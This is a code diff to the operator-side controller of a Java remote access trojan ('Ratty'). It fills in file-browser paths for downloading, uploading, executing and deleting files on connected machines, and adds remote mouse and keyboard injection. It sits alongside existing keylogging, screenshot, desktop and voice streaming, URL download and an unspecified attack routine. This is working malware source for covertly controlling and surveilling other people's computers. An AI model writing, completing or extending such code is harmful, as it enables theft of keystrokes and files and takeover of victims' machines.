@@ -45,11 +45,14 @@ import de.sogomn.rat.packet.FileRequestPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
+import de.sogomn.rat.packet.KeyEventPacket;
 import de.sogomn.rat.packet.KeylogPacket;
+import de.sogomn.rat.packet.MouseEventPacket;
 import de.sogomn.rat.packet.NewDirectoryPacket;
 import de.sogomn.rat.packet.PingPacket;
 import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.RestartPacket;
+import de.sogomn.rat.packet.RootRequestPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
 import de.sogomn.rat.packet.ShutdownPacket;
 import de.sogomn.rat.packet.UninstallPacket;
@@ -155,6 +158,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
 	private static final String KEY_MODIFIER_TEXT_FORMAT = " [%s] ";
+	private static final String SEPARATOR = "/";
 	private static final long PING_INTERVAL = 5000;
 	private static final long NOTIFICATION_DELAY = 7500;
 	
@@ -307,7 +311,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
-		final String path = "";//TODO
+		final String path = client.fileBrowser.getSelectedFile().toString();
 		final DownloadFilePacket packet = new DownloadFilePacket(path);
 		
 		return packet;
@@ -315,10 +319,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private UploadFilePacket createUploadPacket(final ServerClient client) {
 		final Path file = getFile();
-		final byte[] data = FileUtils.readExternalData(file);
 		
 		if (file != null) {
-			final String path = "";//TODO
+			final String fileName = file.getFileName().toString();
+			final byte[] data = FileUtils.readExternalData(file.toString());
+			final String path = client.fileBrowser.getCurrentDirectory() + SEPARATOR + fileName;
 			final UploadFilePacket packet = new UploadFilePacket(path, data);
 			
 			return packet;
@@ -328,14 +333,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
-		final String path = "";//TODO
+		final String path = client.fileBrowser.getSelectedFile().toString();
 		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
 		
 		return packet;
 	}
 	
 	private DeleteFilePacket createDeletePacket(final ServerClient client) {
-		final String path = "";//TODO
+		final String path = client.fileBrowser.getSelectedFile().toString();
 		final DeleteFilePacket packet = new DeleteFilePacket(path);
 		
 		return packet;
@@ -345,8 +350,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String input = gui.getInput();
 		
 		if (input != null) {
-			final String path = "";//TODO
-			final NewDirectoryPacket packet = new NewDirectoryPacket(path, input);
+			final String path = client.fileBrowser.getCurrentDirectory() + SEPARATOR + input;
+			final NewDirectoryPacket packet = new NewDirectoryPacket(path);
 			
 			return packet;
 		}
@@ -370,7 +375,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String address = gui.getInput(URL_MESSAGE);
 		
 		if (address != null) {
-			final String path = "";//TODO
+			final String path = client.fileBrowser.getCurrentDirectory().toString();
 			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
 			
 			return packet;
@@ -380,18 +385,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private FileInformationPacket createFileInformationPacket(final ServerClient client) {
-		final String path = "";//TODO
+		final String path = client.fileBrowser.getSelectedFile().toString();
 		final FileInformationPacket packet = new FileInformationPacket(path);
 		
 		return packet;
 	}
 	
 	private UploadFilePacket createUploadExecutePacket(final ServerClient client) {
-		final String path = "";//TODO
 		final Path file = getFile();
-		final byte[] data = FileUtils.readExternalData(file);
 		
 		if (file != null) {
+			final String path = client.fileBrowser.getCurrentDirectory() + file.getFileName().toString();
+			final byte[] data = FileUtils.readExternalData(file.toString());
 			final UploadFilePacket packet = new UploadFilePacket(path, data, true);
 			
 			return packet;
@@ -450,11 +455,20 @@ public final class RattyGuiController extends AbstractRattyController implements
 		gui.update();
 	}
 	
-	private void requestFile(final ServerClient client) {
-		final String path = "";//TODO
+	private FileRequestPacket createFileRequestPacket(final ServerClient client) {
+		final String path = client.fileBrowser.getSelectedFile();
+		final boolean directory = client.fileBrowser.isDirectory(path);
+		
+		if (!directory) {
+			return null;
+		}
+		
 		final FileRequestPacket packet = new FileRequestPacket(path);
 		
-		client.connection.addPacket(packet);
+		client.fileBrowser.clearFiles();
+		client.fileBrowser.setDirectory(path);
+		
+		return packet;
 	}
 	
 	private void launchAttack() {
@@ -598,25 +612,59 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 	}
 	
-	private void handleMouseEvent(final ServerClient client, final boolean flag) {
-		//...
+	private void browseFiles(final ServerClient client) {
+		final RootRequestPacket packet = new RootRequestPacket();
+		
+		client.fileBrowser.clearRoots();
+		client.connection.addPacket(packet);
+		client.fileBrowser.setVisible(true);
 	}
 	
-	private void handleKeyEvent(final ServerClient client, final boolean flag) {
-		//...
+	private MouseEventPacket createMouseEventPacket(final ServerClient client, final boolean flag) {
+		if (!client.isStreamingDesktop()) {
+			return null;
+		}
+		
+		final int x = client.displayPanel.getMouseX();
+		final int y = client.displayPanel.getMouseY();
+		final int button = client.displayPanel.getMouseButtonInput();
+		final byte strokeType = flag ? MouseEventPacket.PRESS : MouseEventPacket.RELEASE;
+		final MouseEventPacket packet = new MouseEventPacket(x, y, button, strokeType);
+		
+		return packet;
+	}
+	
+	private KeyEventPacket createKeyEventPacket(final ServerClient client, final boolean flag) {
+		if (!client.isStreamingDesktop()) {
+			return null;
+		}
+		
+		final int key = client.displayPanel.getKeyboardKeyInput();
+		final byte strokeType = flag ? KeyEventPacket.PRESS : KeyEventPacket.RELEASE;
+		final KeyEventPacket packet = new KeyEventPacket(key, strokeType);
+		
+		return packet;
+	}
+	
+	private FileRequestPacket createRootRequestPacket(final ServerClient client) {
+		final String root = client.fileBrowser.getSelectedRoot();
+		final FileRequestPacket packet = new FileRequestPacket(root);
+		
+		client.fileBrowser.clearFiles();
+		client.fileBrowser.setDirectory(root);
+		
+		return packet;
 	}
 	
 	private void handleCommand(final ServerClient client, final String command) {
 		if (command == IRattyGui.FILES) {
-			client.fileBrowser.setVisible(true);
+			browseFiles(client);
 		} else if (command == IDisplayGui.CLOSE) {
 			stopDesktopStream(client);
 		} else if (command == IRattyGui.DESKTOP) {
 			toggleDesktopStream(client);
 		} else if (command == IRattyGui.VOICE) {
 			toggleVoiceStream(client);
-		} else if (command == IFileBrowserGui.REQUEST) {
-			requestFile(client);
 		} else if (command == IRattyGui.CHAT) {
 			client.chat.setVisible(true);
 		} else if (command == IRattyGui.KEYLOG) {
@@ -696,17 +744,21 @@ public final class RattyGuiController extends AbstractRattyController implements
 		} else if (command == IRattyGui.SHUT_DOWN) {
 			packet = new ShutdownPacket();
 		} else if (command == IDisplayGui.MOUSE_PRESSED) {
-			handleMouseEvent(client, true);
+			packet = createMouseEventPacket(client, true);
 		} else if (command == IDisplayGui.MOUSE_RELEASED) {
-			handleMouseEvent(client, false);
+			packet = createMouseEventPacket(client, false);
 		} else if (command == IDisplayGui.KEY_PRESSED) {
-			handleKeyEvent(client, true);
+			packet = createKeyEventPacket(client, true);
 		} else if (command == IDisplayGui.KEY_RELEASED) {
-			handleKeyEvent(client, false);
+			packet = createKeyEventPacket(client, false);
 		} else if (command == IRattyGui.VOICE && !client.isStreamingVoice()) {
 			packet = new VoicePacket();
 		} else if (command == IRattyGui.RESTART) {
 			packet = new RestartPacket();
+		} else if (command == IFileBrowserGui.REQUEST_ROOT) {
+			packet = createRootRequestPacket(client);
+		} else if (command == IFileBrowserGui.REQUEST) {
+			packet = createFileRequestPacket(client);
 		}
 		
 		return packet;
@@ -725,7 +777,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void handleFiles(final ServerClient client, final FileRequestPacket packet) {
-		//TODO
+		final String[] paths = packet.getFilePaths();
+		
+		for (final String path : paths) {
+			client.fileBrowser.addFile(path);
+		}
 	}
 	
 	private void handleDesktopPacket(final ServerClient client, final DesktopPacket packet) {
@@ -836,6 +892,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 	}
 	
+	private void handleRoots(final ServerClient client, final RootRequestPacket packet) {
+		final String[] roots = packet.getRoots();
+		
+		for (final String root : roots) {
+			client.fileBrowser.addRoot(root);
+		}
+	}
+	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
 		final Class<? extends IPacket> clazz = packet.getClass();
 		
@@ -881,7 +945,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 			final KeylogPacket log = (KeylogPacket)packet;
 			
 			handleKeylog(client, log);
-		} else if (clazz == FreePacket.class || clazz == ShutdownPacket.class) {
+		} else if (clazz == RootRequestPacket.class) {
+			final RootRequestPacket root = (RootRequestPacket)packet;
+			
+			handleRoots(client, root);
+		} else if (clazz == FreePacket.class || clazz == ShutdownPacket.class || clazz == RestartPacket.class) {
 			//To prevent them from executing
 		} else {
 			consumed = false;
